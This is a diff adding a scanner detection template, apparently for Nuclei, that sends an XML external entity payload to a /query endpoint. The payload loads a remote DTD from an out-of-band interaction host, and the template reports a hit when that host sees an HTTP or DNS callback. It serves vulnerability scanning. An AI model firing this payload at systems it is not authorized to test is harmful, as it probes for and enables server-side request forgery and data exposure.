@@ -1,0 +1,32 @@
+id: xxe-data-exf-query-ssrf
+
+info:
+  name: SSRF via query parameter
+  author: reewardius
+  tags: ssrf,xxe,generic
+  severity: high
+  
+http:
+  - raw:
+      - |
+        POST /query HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/116.0
+        Content-Type: application/xml;charset=UTF-8
+        
+        <?xml version="1.0"?>
+        <!DOCTYPE reset[
+        <!ENTITY % remote SYSTEM "http://{{interactsh-url}}/xxe">
+        %remote;
+        %int;
+        %trick; ]>
+        <reset>
+        </reset>
+        
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+          - "dns"
